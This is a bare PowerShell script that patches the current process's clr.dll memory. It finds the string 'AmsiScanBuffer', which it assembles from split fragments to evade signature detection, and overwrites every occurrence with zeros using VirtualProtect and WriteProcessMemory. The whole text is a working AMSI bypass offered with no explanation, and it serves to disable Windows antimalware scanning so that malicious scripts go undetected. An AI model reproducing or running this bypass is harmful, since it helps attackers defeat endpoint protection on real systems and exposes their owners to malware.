# Define Constants
$PAGE_READONLY = 0x02
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READWRITE = 0x40
$PAGE_EXECUTE_READ = 0x20
$PAGE_GUARD = 0x100
$MEM_COMMIT = 0x1000
$MAX_PATH = 260

# Helper functions
function IsReadable {
    param ($protect, $state)
    return ((($protect -band $PAGE_READONLY) -eq $PAGE_READONLY -or ($protect -band $PAGE_READWRITE) -eq $PAGE_READWRITE -or ($protect -band $PAGE_EXECUTE_READWRITE) -eq $PAGE_EXECUTE_READWRITE -or ($protect -band $PAGE_EXECUTE_READ) -eq $PAGE_EXECUTE_READ) -and ($protect -band $PAGE_GUARD) -ne $PAGE_GUARD -and ($state -band $MEM_COMMIT) -eq $MEM_COMMIT)
}

function PatternMatch {
    param ($buffer, $pattern, $index)
    for ($i = 0; $i -lt $pattern.Length; $i++) {
        if ($buffer[$index + $i] -ne $pattern[$i]) {
            return $false
        }
    }
    return $true
}

if ($PSVersionTable.PSVersion.Major -gt 2) {
    # Create module builder
    $DynAssembly = New-Object System.Reflection.AssemblyName("Win32")
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("Win32", $False)

    # Define structs
    $TypeBuilder = $ModuleBuilder.DefineType("Win32.MEMORY_INFO_BASIC", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
    [void]$TypeBuilder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
    $MEMORY_INFO_BASIC_STRUCT = $TypeBuilder.CreateType()

    # Define structs
    $TypeBuilder = $ModuleBuilder.DefineType("Win32.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
    [void]$TypeBuilder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$TypeBuilder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
    $SYSTEM_INFO_STRUCT = $TypeBuilder.CreateType()

    # P/Invoke Methods
    $TypeBuilder = $ModuleBuilder.DefineType("Win32.Kernel32", "Public, Class")
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, "kernel32.dll", [Reflection.FieldInfo[]]@($SetLastError), @($True))

    # Define [Win32.Kernel32]::VirtualProtect
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("VirtualProtect", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [bool], [Type[]]@([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::GetCurrentProcess
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetCurrentProcess", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@(), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::VirtualQuery
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("VirtualQuery", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@([IntPtr], [Win32.MEMORY_INFO_BASIC].MakeByRefType(), [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::GetSystemInfo
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetSystemInfo", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [void], [Type[]]@([Win32.SYSTEM_INFO].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::GetMappedFileName
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetMappedFileName", "psapi.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::ReadProcessMemory
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("ReadProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::WriteProcessMemory
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("WriteProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    $Kernel32 = $TypeBuilder.CreateType()

    $a = "Ams"
    $b = "iSc"
    $c = "anBuf"
    $d = "fer"
    $signature = [System.Text.Encoding]::UTF8.GetBytes($a + $b + $c + $d)
    $hProcess = [Win32.Kernel32]::GetCurrentProcess()

    # Get system information
    $sysInfo = New-Object Win32.SYSTEM_INFO
    [void][Win32.Kernel32]::GetSystemInfo([ref]$sysInfo)

    # List of memory regions to scan
    $memoryRegions = @()
    $address = [IntPtr]::Zero

    # Scan through memory regions
    while ($address.ToInt64() -lt $sysInfo.lpMaximumApplicationAddress.ToInt64()) {
        $memInfo = New-Object Win32.MEMORY_INFO_BASIC
        if ([Win32.Kernel32]::VirtualQuery($address, [ref]$memInfo, [System.Runtime.InteropServices.Marshal]::SizeOf($memInfo))) {
            $memoryRegions += $memInfo
        }
        # Move to the next memory region
        $address = New-Object IntPtr($memInfo.BaseAddress.ToInt64() + $memInfo.RegionSize.ToInt64())
    }

    $count = 0

    # Loop through memory regions
    foreach ($region in $memoryRegions) {
        # Check if the region is readable and writable
        if (-not (IsReadable $region.Protect $region.State)) {
            continue
        }
        # Check if the region contains a mapped file
        $pathBuilder = New-Object System.Text.StringBuilder $MAX_PATH
        if ([Win32.Kernel32]::GetMappedFileName($hProcess, $region.BaseAddress, $pathBuilder, $MAX_PATH) -gt 0) {
            $path = $pathBuilder.ToString()
            if ($path.EndsWith("clr.dll", [StringComparison]::InvariantCultureIgnoreCase)) {
                # Scan the region for the pattern
                $buffer = New-Object byte[] $region.RegionSize.ToInt64()
                $bytesRead = 0
                [void][Win32.Kernel32]::ReadProcessMemory($hProcess, $region.BaseAddress, $buffer, $buffer.Length, [ref]$bytesRead)
                for ($k = 0; $k -lt ($bytesRead - $signature.Length); $k++) {
                    $found = $True
                    for ($m = 0; $m -lt $signature.Length; $m++) {
                        if ($buffer[$k + $m] -ne $signature[$m]) {
                            $found = $False
                            break
                        }
                    }
                    if ($found) {
                        $oldProtect = 0
                        if (($region.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
                        }
                        $replacement = New-Object byte[] $signature.Length
                        $bytesWritten = 0
                        [void][Win32.Kernel32]::WriteProcessMemory($hProcess, [IntPtr]::Add($region.BaseAddress, $k), $replacement, $replacement.Length, [ref]$bytesWritten)
                        $count++
                        if (($region.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $region.Protect, [ref]$oldProtect)
                        }
                    }
                }
            }
        }
    }
}
